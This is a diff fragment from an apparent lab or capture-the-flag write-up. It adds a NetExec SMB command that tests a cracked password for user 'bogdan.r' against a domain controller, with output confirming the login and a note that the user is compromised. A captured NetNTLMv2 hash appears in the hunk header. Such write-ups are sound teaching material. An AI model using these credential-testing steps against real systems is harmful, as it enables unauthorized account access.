@@ -552,8 +552,12 @@ BOGDAN.R::SHADOWGATE:e946643da7fbabaa:12ed90651892d40d041206c02af03988:010100000
 The hash cracked
 
 ```python
-
+nxc smb sg-dc01.shadowgate.local -u bogdan.r -p 'bogdan0126'              
+SMB         10.1.232.232    445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.232.232    445    SG-DC01          [+] shadowgate.local\bogdan.r:bogdan0126
 ```
+
+The user is compromised
 
 # Enumeration as `bogdan.r`
 
